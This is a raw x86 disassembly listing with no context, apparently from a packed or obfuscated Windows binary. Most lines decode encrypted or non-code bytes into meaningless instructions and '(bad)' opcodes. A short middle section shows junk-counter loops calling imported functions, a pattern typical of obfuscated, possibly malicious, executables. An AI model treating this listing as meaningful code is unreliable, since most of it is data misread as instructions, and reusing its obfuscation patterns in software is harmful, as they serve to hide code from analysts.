  40d592:	pop    edx
  40d593:	addr16 dec ebp
  40d595:	fisttp WORD PTR [edi-0x3ede8dbd]
  40d59b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d59c:	sar    edi,cl
  40d59e:	pop    edx
  40d59f:	pop    eax
  40d5a0:	adc    esi,ecx
  40d5a2:	mov    ah,0xc6
  40d5a4:	push   ebp
  40d5a5:	ror    ebx,cl
  40d5a7:	cdq    
  40d5a8:	jmp    0xf4b7d1c2
  40d5ad:	test   al,0xc3
  40d5af:	mov    bl,0x60
  40d5b1:	cdq    
  40d5b2:	add    edx,edx
  40d5b4:	pop    ss
  40d5b5:	(bad)  
  40d5b6:	push   esi
  40d5b7:	pop    esi
  40d5b8:	mov    al,ds:0x75d7f1f6
  40d5bd:	sub    eax,0xfcd0b87d
  40d5c2:	mov    cl,0xb5
  40d5c4:	lgs    esp,FWORD PTR [eax+ebx*4-0x26]
  40d5c9:	mov    ch,BYTE PTR [ecx]
  40d5cb:	adc    al,0xf5
  40d5cd:	xchg   ebp,eax
  40d5ce:	sar    ebx,cl
  40d5d0:	dec    ebp
  40d5d1:	adc    BYTE PTR [edi],ah
  40d5d3:	xor    bh,BYTE PTR [edi+0x5d]
  40d5d6:	cmp    al,0xf
  40d5d8:	daa    
  40d5d9:	bound  esi,QWORD PTR [ebp+0x22]
  40d5dc:	fmulp  st(0),st
  40d5de:	pop    ebx
  40d5df:	push   esp
  40d5e0:	call   0x5baa:0x97465d31
  40d5e7:	push   edi
  40d5e8:	rol    edx,0xe5
  40d5eb:	sub    BYTE PTR [esi+ebx*8],al
  40d5ee:	xor    cl,cl
  40d5f0:	mov    bl,0x1b
  40d5f2:	je     0x40d5b5
  40d5f4:	popa   
  40d5f5:	mov    al,0x9e
  40d5f7:	add    BYTE PTR [edx-0x76bfedcf],0x6a
  40d5fe:	clc    
  40d5ff:	jl     0x40d619
  40d601:	in     eax,dx
  40d602:	mov    ah,0xf8
  40d604:	adc    BYTE PTR fs:[ebp+0x5bb0b87a],al
  40d60b:	push   0xfffffff0
  40d60d:	push   es
  40d60e:	mov    ?,WORD PTR [ebx+eax*8-0xc]
  40d612:	push   es
  40d613:	fmul   QWORD PTR [esi-0x42]
  40d616:	in     eax,0x43
  40d618:	add    BYTE PTR [ecx],0xb2
  40d61b:	(bad)  
  40d61c:	sar    ch,cl
  40d61e:	out    0xfd,al
  40d620:	xor    edx,edi
  40d622:	push   eax
  40d623:	pop    edi
  40d624:	gs push esp
  40d626:	or     bl,BYTE PTR [esi+ecx*4-0x6f]
  40d62a:	mov    ch,0x70
  40d62c:	adc    eax,DWORD PTR [ebp+0x3]
  40d62f:	das    
  40d630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d631:	pushf  
  40d632:	lods   al,BYTE PTR ds:[esi]
  40d633:	shl    BYTE PTR [ecx+0x372d01e3],1
  40d639:	retf   0x49dc
  40d63c:	jmp    0x86901e6b
  40d641:	or     eax,0x2b61269d
  40d646:	dec    ebx
  40d647:	retf   
  40d648:	pop    ds
  40d649:	shl    DWORD PTR [esi-0x13],1
  40d64c:	into   
  40d64d:	jne    0x40d6c8
  40d64f:	inc    esi
  40d650:	fstp   TBYTE PTR [esi+0x818b0a8]
  40d656:	outs   dx,DWORD PTR ds:[esi]
  40d657:	add    DWORD PTR [ebx+0x1b],0xffffff94
  40d65b:	xchg   edx,eax
  40d65c:	ss shl al,cl
  40d65f:	mov    cl,0x25
  40d661:	push   ss
  40d662:	cmp    BYTE PTR [edx+0x1286b79c],ah
  40d668:	add    ebp,edx
  40d66a:	iret   
  40d66b:	retf   
  40d66c:	push   edi
  40d66d:	pop    ss
  40d66e:	test   eax,0x182f71c1
  40d673:	scas   eax,DWORD PTR es:[edi]
  40d674:	aam    0x5b
  40d676:	fsubr  DWORD PTR [esi]
  40d678:	push   eax
  40d679:	pop    ebx
  40d67a:	out    dx,eax
  40d67b:	add    ecx,DWORD PTR [ecx-0x24]
  40d67e:	pusha  
  40d67f:	push   eax
  40d680:	mov    dl,0xb3
  40d682:	xor    BYTE PTR [esp+ebx*8-0x452daf1d],ah
  40d689:	retf   0xeb04
  40d68c:	fdiv   st(5),st
  40d68e:	adc    dl,ch
  40d690:	sub    bh,dh
  40d692:	cmp    edi,esp
  40d694:	sti    
  40d695:	or     ecx,ebx
  40d697:	call   0xa61c972e
  40d69c:	push   es
  40d69d:	sbb    DWORD PTR [eax-0x4d6b3374],eax
  40d6a3:	cmp    DWORD PTR [ebp+0x23],edx
  40d6a6:	aad    0xda
  40d6a8:	ss call 0xde4f:0x56d9223e
  40d6b0:	jb     0x40d661
  40d6b2:	add    eax,0xa6805a0c
  40d6b7:	inc    eax
  40d6b8:	daa    
  40d6b9:	cdq    
  40d6ba:	aad    0x9e
  40d6bc:	lahf   
  40d6bd:	mov    esp,0x4bc23951
  40d6c2:	pop    esi
  40d6c3:	cs call 0x3fc7:0x55176553
  40d6cb:	mov    BYTE PTR [esi-0x40],dh
  40d6ce:	xor    ah,BYTE PTR [ebx]
  40d6d0:	jnp    0x40d653
  40d6d2:	mov    ebp,DWORD PTR [edi+0x4f]
  40d6d5:	clc    
  40d6d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6d7:	sbb    edi,DWORD PTR [edx+ecx*2-0x5bfb38c5]
  40d6de:	call   0xbaf5:0xd0f13dea
  40d6e5:	mov    dh,0x73
  40d6e7:	mov    esp,0x84ad7eac
  40d6ec:	add    DWORD PTR [ecx-0x249ce5cf],ebx
  40d6f2:	addr16 retf 
  40d6f4:	test   al,0xab
  40d6f6:	fidivr WORD PTR [edx]
  40d6f8:	or     eax,0x4573b91b
  40d6fd:	add    BYTE PTR [eax],al
  40d6ff:	add    edx,ecx
  40d701:	not    esi
  40d703:	mov    esi,0x7879
  40d708:	or     edi,0x6bdc
  40d70e:	mov    edi,0x1556
  40d713:	sub    DWORD PTR ds:0x43449d,0x432e5e
  40d71d:	xchg   esi,ecx
  40d71f:	sub    edx,edi
  40d721:	xor    DWORD PTR ds:0x434491,0x1648
  40d72b:	xor    esi,esi
  40d72d:	and    DWORD PTR ds:0x432e4a,0x0
  40d737:	jmp    0x40d749
  40d73c:	mov    ecx,DWORD PTR ds:0x432e4a
  40d742:	inc    ecx
  40d743:	mov    DWORD PTR ds:0x432e4a,ecx
  40d749:	cmp    DWORD PTR ds:0x432e4a,0x11
  40d750:	jae    0x40d7ce
  40d756:	cmp    DWORD PTR ds:0x432e4a,0x1e
  40d75d:	jne    0x40d76e
  40d763:	push   0x470a
  40d768:	call   DWORD PTR ds:0x432cf2
  40d76e:	jmp    0x40d73c
  40d773:	and    DWORD PTR ds:0x434406,0x0
  40d77d:	mov    ecx,DWORD PTR ds:0x434406
  40d783:	inc    ecx
  40d784:	mov    DWORD PTR ds:0x434406,ecx
  40d78a:	cmp    DWORD PTR ds:0x434406,0xa
  40d791:	jne    0x40d7a7
  40d797:	push   0x43295b
  40d79c:	push   0x4328fd
  40d7a1:	call   DWORD PTR ds:0x432a76
  40d7a7:	cmp    DWORD PTR ds:0x434406,0x9
  40d7ae:	jne    0x40d7c1
  40d7b4:	mov    ecx,DWORD PTR ds:0x434406
  40d7ba:	inc    ecx
  40d7bb:	mov    DWORD PTR ds:0x434406,ecx
  40d7c1:	cmp    DWORD PTR ds:0x434406,0x18
  40d7c8:	jb     0x40d77d
  40d7ce:	mov    DWORD PTR [ebp-0x28],esi
  40d7d1:	mov    DWORD PTR [ebp-0x2c],esi
  40d7d4:	and    DWORD PTR ds:0x434416,0x0
  40d7de:	jmp    0x40d7f0
  40d7e3:	mov    ecx,DWORD PTR ds:0x434416
  40d7e9:	inc    ecx
  40d7ea:	mov    DWORD PTR ds:0x434416,ecx
  40d7f0:	cmp    DWORD PTR ds:0x434416,0x1f
  40d7f7:	jae    0x40d83c
  40d7fd:	cmp    DWORD PTR ds:0x434416,0x11
  40d804:	jne    0x40d813
  40d80a:	push   DWORD PTR [ebp-0x28]
  40d80d:	call   DWORD PTR ds:0x432a7a
  40d813:	cmp    DWORD PTR ds:0x434416,0x10
  40d81a:	jne    0x40d82d
  40d820:	mov    ecx,DWORD PTR ds:0x434416
  40d826:	inc    ecx
  40d827:	mov    DWORD PTR ds:0x434416,ecx
  40d82d:	jmp    0x40d7e3
  40d832:	or     DWORD PTR ds:0x432e62,0x1ed3
  40d83c:	mov    DWORD PTR [ebp-0x14],esi
  40d83f:	adc    DWORD PTR ds:0x432784,0x1c7c
  40d849:	jmp    0x40dc3d
  40d84e:	addr16 int3 
  40d850:	ss data16 mov cl,0x62
  40d854:	ja     0x40d81f
  40d856:	or     bl,BYTE PTR [esi-0x3c]
  40d859:	in     al,0x69
  40d85b:	int    0x1f
  40d85d:	and    DWORD PTR [edi-0x76],edx
  40d860:	jo     0x40d8d2
  40d862:	dec    ecx
  40d863:	jge    0x40d8d5
  40d865:	jo     0x40d81f
  40d867:	pop    ss
  40d868:	stos   BYTE PTR es:[edi],al
  40d869:	jno    0x40d8c9
  40d86b:	mov    esi,cs
  40d86d:	mov    eax,ds:0x738de9c
  40d872:	aas    
  40d873:	imul   esp,DWORD PTR [ebx+0x46d99ff5],0xffffffba
  40d87a:	(bad)  
  40d87b:	mov    dh,0x50
  40d87d:	test   eax,0xdecb23f7
  40d882:	fist   DWORD PTR [edi-0x4009f4d1]
  40d888:	push   edi
  40d889:	mov    bh,0x22
  40d88b:	jmp    0x40d826
  40d88d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d88e:	out    0x6a,eax
  40d890:	(bad)  
  40d891:	push   ds
  40d892:	xor    eax,0x59876629
  40d897:	push   ebp
  40d898:	or     DWORD PTR [esi],edi
  40d89a:	daa    
  40d89b:	js     0x40d88a
  40d89d:	push   esp
  40d89e:	jmp    0xe4b7:0x7c2b703d
  40d8a5:	and    esp,DWORD PTR [ebx]
  40d8a7:	sub    ebx,DWORD PTR [edi]
  40d8a9:	jb     0x40d836
  40d8ab:	pop    ecx
  40d8ac:	mov    ebx,0x842292b8
  40d8b1:	int    0xa3
  40d8b3:	jge    0x40d8c9
  40d8b5:	cmp    esi,edi
  40d8b7:	ret    0xeacd
  40d8ba:	les    esi,FWORD PTR [eax+0x53ca8c2a]
  40d8c0:	loopne 0x40d8aa
  40d8c2:	adc    dl,BYTE PTR [edi+0x79768bf1]
  40d8c8:	push   edx
  40d8c9:	outs   dx,DWORD PTR ds:[esi]
  40d8ca:	cmc    
  40d8cb:	fdivr  DWORD PTR [eax+0x436d52ad]
  40d8d1:	das    
  40d8d2:	inc    eax
  40d8d3:	lea    edi,[esi+esi*4+0x79ebba9e]
  40d8da:	daa    
  40d8db:	jno    0x40d909
  40d8dd:	and    edi,edi
  40d8df:	mov    bh,0x39
  40d8e1:	xchg   BYTE PTR [ebx],bl
  40d8e3:	fidivr DWORD PTR [edi-0x6d]
  40d8e6:	jle    0x40d8ea
  40d8e8:	mov    edi,0x75cb3ef0
  40d8ed:	push   ebp
  40d8ee:	ss inc esi
  40d8f0:	mov    edx,0x98d8f808
  40d8f5:	xor    ebx,eax
  40d8f7:	arpl   ax,di
  40d8f9:	lods   eax,DWORD PTR ds:[esi]
  40d8fa:	div    DWORD PTR [ebx+0x6d]
  40d8fd:	retf   0x36a2
  40d900:	nop
  40d901:	std    
  40d902:	loopne 0x40d933
  40d904:	cs js  0x40d899
  40d907:	cs fs js 0x40d8e0
  40d90b:	sbb    ch,BYTE PTR [ebx+0x309a50de]
  40d911:	scas   al,BYTE PTR es:[edi]
  40d912:	jmp    0x40d8d3
  40d914:	push   ss
  40d915:	cmp    ebp,DWORD PTR [ecx+0x5d746b16]
  40d91b:	adc    dl,BYTE PTR [edx-0x75]
  40d91e:	out    dx,eax
  40d91f:	jns    0x40d8bd
  40d921:	shl    edx,1
  40d923:	push   cs
  40d924:	(bad)  
  40d925:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d926:	sbb    eax,DWORD PTR [ebx]
  40d928:	adc    eax,0x88799cd6
  40d92d:	sahf   
  40d92e:	in     eax,dx
  40d92f:	sub    bl,BYTE PTR [esi-0x15c9e5d]
  40d935:	fcom   QWORD PTR [esi]
  40d937:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d938:	mov    bl,cl
  40d93a:	push   es
  40d93b:	jg     0x40d9b1
  40d93d:	ror    DWORD PTR [edi-0x1c],cl
  40d940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d941:	mov    cl,0xf2
  40d943:	and    BYTE PTR [ebp-0x7f49dc3c],dl
  40d949:	std    
  40d94a:	jb     0x40d8de
  40d94c:	or     esi,0x34bb9982
  40d952:	cmp    eax,0x7c1291fd
  40d957:	dec    edx
  40d958:	or     BYTE PTR [ebp+0x2b4b644f],0xa3
  40d95f:	pop    es
  40d960:	jns    0x40d961
  40d962:	in     eax,dx
  40d963:	lds    edx,FWORD PTR [ebp-0x33]
  40d966:	dec    eax
  40d967:	mov    ah,0x16
  40d969:	xchg   DWORD PTR ds:0xd8e1bcb9,esp
  40d96f:	test   al,0x8e
  40d971:	lahf   
  40d972:	test   BYTE PTR [ebp-0x4a],cl
  40d975:	adc    DWORD PTR [ecx-0x3d],0x5b662643
  40d97c:	in     al,0x10
  40d97e:	sti    
  40d97f:	in     al,dx
  40d980:	xor    al,BYTE PTR [edx]
  40d982:	mov    eax,0x1c6da00f
  40d987:	mov    bl,0x69
  40d989:	and    dh,0x4d
  40d98c:	jmp    0x40d9ef
  40d98e:	pop    ecx
  40d98f:	pop    ecx
  40d990:	test   edx,esp
  40d992:	xchg   DWORD PTR [eax],ebp
  40d994:	mov    edx,ecx
  40d996:	cli    
  40d997:	cld    
  40d998:	out    dx,al
  40d999:	(bad)  
  40d99a:	div    esi
  40d99c:	sub    bh,BYTE PTR [esi-0x7af11f70]
  40d9a2:	fld    DWORD PTR [eax-0x1d02f645]
  40d9a8:	(bad)  
  40d9a9:	aam    0xa9
  40d9ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9ac:	fistp  WORD PTR [esi+0x13]
  40d9af:	pushf  
  40d9b0:	cdq    
  40d9b1:	mov    dh,0x21
  40d9b3:	inc    esi
  40d9b4:	push   cs
  40d9b5:	xbegin 0x39439a05
  40d9bb:	pop    ecx
  40d9bc:	xlat   BYTE PTR ds:[ebx]
  40d9bd:	aaa    
  40d9be:	dec    esp
  40d9bf:	dec    ecx
  40d9c0:	retf   
  40d9c1:	adc    al,0x73
  40d9c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9c4:	rcl    BYTE PTR [esi-0x32b50193],1
  40d9ca:	or     cl,dh
  40d9cc:	popa   
  40d9cd:	mov    bl,cl
  40d9cf:	sbb    BYTE PTR [ebp-0x4176f885],dl
  40d9d5:	int    0x5b
  40d9d7:	pop    edi
  40d9d8:	sbb    eax,0x6c3a370b
  40d9dd:	fdiv   DWORD PTR [ebp-0x347528c5]
  40d9e3:	jg     0x40d99a
  40d9e5:	ror    esp,1
  40d9e7:	mov    bh,0x73
  40d9e9:	jmp    0x40d970
  40d9eb:	nop
  40d9ec:	test   bl,0xf8
  40d9ef:	pop    ds
  40d9f0:	mul    BYTE PTR [edx+0xc8ad861]
  40d9f6:	inc    ecx
  40d9f7:	arpl   WORD PTR [edx+0x6d],di
  40d9fa:	retf   0x8d0
  40d9fd:	mov    ecx,0x300427d5
  40da02:	adc    al,0x48
  40da04:	or     edx,DWORD PTR [ebp+0x2eac631]
  40da0a:	fisttp DWORD PTR [esi-0x5a8b3828]
  40da10:	sbb    BYTE PTR [eax+0x7],dh
  40da13:	loope  0x40da4f
  40da15:	or     esi,DWORD PTR ds:0xf30d44c8
  40da1b:	in     al,dx
  40da1c:	cmp    ch,BYTE PTR ds:0x3a01aec4
  40da22:	jnp    0x40da51
  40da24:	sahf   
  40da25:	lds    esi,FWORD PTR [eax-0x2c]
  40da28:	add    BYTE PTR [esi],cl
  40da2a:	in     al,dx
  40da2b:	jp     0x40da5f
  40da2d:	scas   eax,DWORD PTR es:[edi]
  40da2e:	xchg   ecx,eax
  40da2f:	jnp    0x40da35
  40da31:	jl     0x40da40
  40da33:	popf   
  40da34:	add    cl,BYTE PTR [ebx-0x96d579]
  40da3a:	add    al,0xca
  40da3c:	pop    edi
  40da3d:	mov    eax,gs:0xccc73ccc
  40da43:	hlt    
  40da44:	adc    BYTE PTR [ebx-0x546478f7],al
  40da4a:	ins    DWORD PTR es:[edi],dx
  40da4b:	je     0x40dac1
  40da4d:	dec    esp
  40da4e:	and    eax,0x5a3c5b04
  40da53:	mov    ss:0x8b098b2b,eax
  40da59:	pop    ebp
  40da5a:	mov    cl,BYTE PTR [eax-0x22b542]
  40da60:	sub    eax,0x5ce282cb
  40da65:	inc    ebp
  40da66:	jg     0x40da86
  40da68:	sub    ch,BYTE PTR [eax-0x73]
  40da6b:	leave  
  40da6c:	mov    al,0xb4
  40da6e:	test   eax,0x5ea1568e
  40da73:	cmp    edx,ecx
  40da75:	xchg   ebx,eax
  40da76:	and    cl,BYTE PTR cs:[edi+0x678b5632]
  40da7d:	dec    esi
  40da7e:	adc    BYTE PTR [edi+ebp*1],ch
  40da81:	pop    edx
  40da82:	mov    BYTE PTR [esi+0x61],0xc6
  40da86:	pop    ecx
  40da87:	sbb    BYTE PTR [eax+0x35],bh
  40da8a:	jecxz  0x40da16
  40da8c:	cmp    edx,ebp
  40da8e:	(bad)  
  40da8f:	cmp    DWORD PTR ds:0x1cdc24d7,ebp
  40da95:	dec    esi
  40da96:	mov    dh,0xfa
  40da98:	lahf   
  40da99:	add    edx,edx
  40da9b:	ins    BYTE PTR es:[edi],dx
  40da9c:	mov    bh,0x64
  40da9e:	out    0xa,al
  40daa0:	(bad)  
  40daa1:	add    al,0x26
  40daa3:	adc    BYTE PTR [edi+0x6b343ffd],cl
  40daa9:	aas    
  40daaa:	popf   
  40daab:	arpl   WORD PTR [esi],di
  40daad:	stos   BYTE PTR es:[edi],al
  40daae:	fisub  DWORD PTR [edi]
  40dab0:	in     al,0x20
  40dab2:	jb     0x40da8a
  40dab4:	mov    edx,0x847d3868
  40dab9:	sub    dl,ah
  40dabb:	popf   
  40dabc:	outs   dx,BYTE PTR ds:[esi]
  40dabd:	and    al,0x7f
  40dabf:	stos   BYTE PTR es:[edi],al
  40dac0:	rcr    DWORD PTR [ebx-0x2],0xf7
  40dac4:	pop    esp
  40dac5:	mov    ds:0xabc30378,al
  40daca:	sub    BYTE PTR [esi-0x645deb9e],ah
  40dad0:	mov    ebx,DWORD PTR [ecx-0x7d]
  40dad3:	ja     0x40da67
  40dad5:	cli    
  40dad6:	dec    esp
  40dad7:	es (bad) 
  40dad9:	jp     0x40da95
  40dadb:	sbb    dh,BYTE PTR [ebx+0x698ca329]
  40dae1:	loope  0x40db18
  40dae3:	enter  0x78ad,0x3f
  40dae7:	mov    bh,0x7d
  40dae9:	lock mov ah,BYTE PTR [eax-0x4]
  40daed:	sbb    al,0x10
  40daef:	and    DWORD PTR [edx+0x35548c4a],eax
  40daf5:	adc    dh,BYTE PTR [edx+0x2d43ceb6]
  40dafb:	scas   eax,DWORD PTR es:[edi]
  40dafc:	and    al,0xf7
  40dafe:	xor    al,0x59
  40db00:	(bad)  
  40db02:	ins    BYTE PTR es:[edi],dx
  40db03:	pop    edi
  40db04:	rol    bh,1
  40db06:	mov    dl,0x9d
  40db08:	xor    eax,0x8b8a6cdb
  40db0d:	lods   al,BYTE PTR ds:[esi]
  40db0e:	and    eax,0x9ba2eb44
  40db13:	test   eax,0xadd3d2f0
  40db18:	push   esi
  40db19:	ja     0x40db09
  40db1b:	dec    esp
  40db1c:	in     eax,dx
  40db1d:	fmul   DWORD PTR [esi+0x70]
  40db20:	and    BYTE PTR [ebx+edx*8+0x2d86b8f8],0x81
  40db28:	(bad)  
  40db29:	mov    eax,0x3e6f6d77
  40db2e:	lock outs dx,DWORD PTR ds:[esi]
  40db30:	test   BYTE PTR [edi],bh
  40db32:	fist   DWORD PTR ds:0xd8b2ae54
  40db38:	jbe    0x40dae7
  40db3a:	sbb    BYTE PTR [esi+0x42abf92c],ah
  40db40:	push   ebp
  40db41:	mov    ch,0xdc
  40db43:	ja     0x40db6f
  40db45:	(bad)  
  40db46:	dec    edi
  40db47:	fwait
  40db48:	ins    BYTE PTR es:[edi],dx
  40db49:	sbb    BYTE PTR [ecx-0x23],dl
  40db4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db4d:	out    dx,al
  40db4e:	push   es
  40db4f:	or     eax,0xfebef583
  40db54:	jno    0x40db50
  40db56:	xchg   esp,eax
  40db57:	out    0x5b,eax
  40db59:	xor    esi,DWORD PTR [edi-0x63f3f82b]
  40db5f:	mov    eax,edi
  40db61:	in     eax,0xf
  40db63:	mov    bl,0x61
  40db65:	lea    eax,[ebx-0x1eefe658]
  40db6b:	ficomp WORD PTR [esi+0x702dd18f]
  40db71:	push   ebp
  40db72:	outs   dx,BYTE PTR ds:[esi]
  40db73:	test   edi,0x84cbcc17
  40db79:	fwait
  40db7a:	cwde   
  40db7b:	xchg   edx,eax
  40db7d:	inc    edi
  40db7e:	in     eax,0xb8
  40db80:	xor    BYTE PTR ds:[ecx+0x4c],0x73
  40db85:	add    dh,ch
  40db87:	ins    DWORD PTR es:[edi],dx
  40db88:	(bad)  
  40db89:	lahf   
  40db8a:	call   0x60fab9ba
  40db8f:	daa    
  40db90:	in     eax,0xa9
  40db92:	jb     0x40dbd5
  40db94:	pop    ss
  40db95:	xchg   ecx,eax
  40db96:	or     BYTE PTR [esi],dh
  40db98:	xor    dl,ah
  40db9a:	repnz xchg edx,eax
  40db9c:	cmp    DWORD PTR [esp+eax*2+0x3f],ecx
  40dba0:	out    dx,al
  40dba1:	mov    ebx,0x3f264d49
  40dba6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dba7:	out    0x8f,al
  40dba9:	out    dx,eax
  40dbaa:	pop    ebp
  40dbab:	pop    esi
  40dbac:	lock or esp,DWORD PTR [ebx+0x14]
  40dbb0:	push   0xd34510b0
  40dbb5:	pop    ecx
  40dbb6:	nop
  40dbb7:	cmp    BYTE PTR [ebx-0x4481dcf2],bh
  40dbbd:	call   0x29c1:0x5ae34842
  40dbc4:	ror    DWORD PTR [edi],1
  40dbc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbc7:	repz mov ds:0x1df183ee,al
  40dbcd:	retf   
  40dbce:	sbb    eax,0x4fd44da9
  40dbd3:	sbb    DWORD PTR [esp+ebp*2+0x6c8641ce],ebx
  40dbda:	(bad)  
  40dbdb:	pop    esp
  40dbdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbdd:	cdq    
  40dbde:	sbb    ecx,ebx
  40dbe0:	retf   
  40dbe1:	call   0x17dd:0x96f7ad69
  40dbe8:	mul    ebp
  40dbea:	lea    ebp,[ecx]
  40dbec:	and    ebp,esp
  40dbee:	sub    ah,BYTE PTR [eax-0x6]
  40dbf1:	pop    ebp
  40dbf2:	cmc    
  40dbf3:	pop    esi
  40dbf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbf5:	jmp    0x40db78
  40dbf7:	outs   dx,DWORD PTR ds:[esi]
  40dbf8:	imul   edx,DWORD PTR [ecx+0x32d00266],0xffffff81
  40dbff:	inc    edi
  40dc00:	jb     0x40dc06
  40dc02:	xchg   edi,eax
  40dc03:	pop    esi
  40dc04:	jmp    0x40dc34
  40dc06:	sub    DWORD PTR [edi-0x56cf767d],edi
  40dc0c:	dec    esp
  40dc0d:	maskmovq mm1,(bad)
  40dc0e:	test   DWORD PTR [ebp+0x6],0xabac4630
  40dc15:	js     0x40dbef
  40dc17:	mov    cl,0xe6
  40dc19:	imul   ecx,DWORD PTR [edx-0x23e1e4d7],0x1e688c88
  40dc23:	(bad)  
  40dc24:	add    al,0x5e
  40dc26:	xchg   ebx,eax
  40dc27:	aas    
  40dc28:	mov    esp,eax
  40dc2a:	or     ebp,DWORD PTR [ebp-0x4b8a2cdb]
  40dc30:	sahf   
  40dc31:	sahf   
  40dc32:	loope  0x40dbbb
  40dc34:	addr16 int3 
  40dc36:	ja     0x40dc2f
  40dc38:	std    
  40dc39:	adc    eax,0x89b66f76
  40dc3e:	jne    0x40dc38
  40dc40:	mov    ecx,DWORD PTR ds:0x43441a
  40dc46:	and    DWORD PTR ds:0x432e46,ecx
  40dc4c:	mov    ecx,DWORD PTR [ebp-0x18]
  40dc4f:	and    DWORD PTR ds:0x432778,0x434491
  40dc59:	xor    ecx,eax
  40dc5b:	jmp    0x40e04f
  40dc60:	mov    bl,0x93
  40dc62:	iret   
  40dc63:	(bad)
  40dc66:	mov    cl,0x71
  40dc68:	out    0x43,eax
  40dc6a:	fs jb  0x40dc00
  40dc6d:	sub    al,0x17
  40dc6f:	stc    
  40dc70:	mov    al,ds:0x49707096
  40dc75:	jge    0x40dce7
  40dc77:	jo     0x40dc24
  40dc79:	out    dx,eax
  40dc7a:	call   0xb650:0xeea0d799
  40dc81:	loop   0x40dc85
  40dc83:	xor    eax,0x302d979f
  40dc88:	sub    BYTE PTR [edx-0x7198f071],bl
  40dc8e:	ja     0x40dce6
  40dc90:	inc    ebp
  40dc91:	pop    edi
  40dc92:	adc    BYTE PTR [edx+0x6cf55239],al
  40dc98:	ins    DWORD PTR es:[edi],dx
  40dc99:	aas    
  40dc9a:	sbb    eax,DWORD PTR [ebx]
  40dc9c:	imul   esp,DWORD PTR [edx+0x5eb25572],0x6bbcc3a
  40dca6:	mov    ebx,0xa67518b9
  40dcab:	daa    
  40dcac:	cwde   
  40dcad:	adc    eax,0x559834ee
  40dcb2:	xor    DWORD PTR [esi+ecx*4+0x75b5b5d7],ebx
  40dcb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcba:	xchg   DWORD PTR [esi],esi
  40dcbc:	dec    ecx
  40dcbd:	hlt    
  40dcbe:	mov    bh,0xf4
  40dcc0:	mov    ch,bl
  40dcc2:	dec    eax
  40dcc3:	mov    bl,0x3b
  40dcc5:	fdiv   st,st(3)
  40dcc7:	shr    BYTE PTR [eax],cl
  40dcc9:	fwait
  40dcca:	inc    eax
  40dccb:	adc    ebx,DWORD PTR [ebp-0x6c99dfae]
  40dcd1:	mov    ebp,0x4818e86f
  40dcd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcd7:	les    ebx,FWORD PTR [edi]
  40dcd9:	mov    ebp,0xe7f06448
  40dcde:	xchg   ebx,eax
  40dcdf:	adc    dh,BYTE PTR [esi]
  40dce1:	jl     0x40dce8
  40dce3:	add    bl,BYTE PTR [esi+0x2a77c1f7]
  40dce9:	jge    0x40dd13
  40dceb:	sbb    esi,DWORD PTR [edx-0x4c]
  40dcee:	addr16 and bl,bl
  40dcf1:	adc    al,0xaa
  40dcf3:	adc    eax,0x9f469a8
  40dcf8:	jp     0x40dd3c
  40dcfa:	fiadd  WORD PTR [eax-0x7207f7d0]
  40dd00:	mov    bl,0x52
  40dd02:	jle    0x40dd70
  40dd04:	test   eax,0xa6e23fe4
  40dd09:	xchg   esi,eax
  40dd0a:	cld    
  40dd0b:	or     BYTE PTR [esi-0x1e],bh
  40dd0e:	mov    eax,ds:0x30d5a761
  40dd13:	lock sahf 
  40dd15:	xor    BYTE PTR [ebp-0x14],bl
  40dd18:	fistp  QWORD PTR [edx+edi*1-0x1c]
  40dd1c:	sbb    BYTE PTR ds:0x496451b3,al
  40dd22:	mov    esp,0x8b1a4d72
  40dd27:	sbb    dl,BYTE PTR [ebp+0x553785db]
  40dd2d:	xchg   edx,eax
  40dd2e:	jo     0x40dd5d
  40dd30:	lods   al,BYTE PTR ds:[esi]
  40dd31:	or     BYTE PTR [edi+0x54],0xfa
  40dd35:	add    al,0x39
  40dd37:	xchg   DWORD PTR gs:[edi],eax
  40dd3a:	outs   dx,BYTE PTR ds:[esi]
  40dd3b:	sub    DWORD PTR ds:0xb213c0d1,ebp
  40dd41:	mov    al,ds:0xe4a4fa3
  40dd46:	xchg   ecx,eax
  40dd47:	(bad)  
  40dd48:	shr    DWORD PTR [edi+0x47de75ed],1
  40dd4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd4f:	std    
  40dd50:	adc    BYTE PTR [ebp+0x6],al
  40dd53:	inc    ebp
  40dd54:	pop    ss
  40dd55:	(bad)  
  40dd58:	je     0x40dd16
  40dd5a:	mov    dl,0x28
  40dd5c:	push   esp
  40dd5d:	fwait
  40dd5e:	pop    edx
  40dd5f:	les    edi,FWORD PTR [ebx+ebx*8]
  40dd62:	aam    0xdc
  40dd64:	cs dec esp
  40dd66:	icebp  
  40dd67:	mov    ah,0xd7
  40dd69:	cdq    
  40dd6a:	hlt    
  40dd6b:	add    al,ch
  40dd6d:	mov    BYTE PTR [ebx],bl
  40dd6f:	fsub   QWORD PTR [ebp-0x26cb946]
  40dd75:	push   es
  40dd76:	out    dx,al
  40dd77:	inc    edx
  40dd78:	lahf   
  40dd79:	imul   esi,DWORD PTR [edi-0x2e],0x65
  40dd7d:	jo     0x40dd5d
  40dd7f:	ss test eax,0xbc4d0f89
  40dd85:	idiv   ch
  40dd87:	iret   
  40dd88:	adc    ecx,0x5276f5c3
  40dd8e:	xchg   cl,dl
  40dd90:	in     eax,0xcf
  40dd92:	in     eax,0x45
  40dd94:	lods   al,BYTE PTR ds:[esi]
  40dd95:	ror    dl,cl
  40dd97:	sti    
  40dd98:	push   ds
  40dd99:	mov    edi,0x24486779
  40dd9e:	sti    
  40dd9f:	out    0xe2,al
  40dda1:	stos   DWORD PTR es:[edi],eax
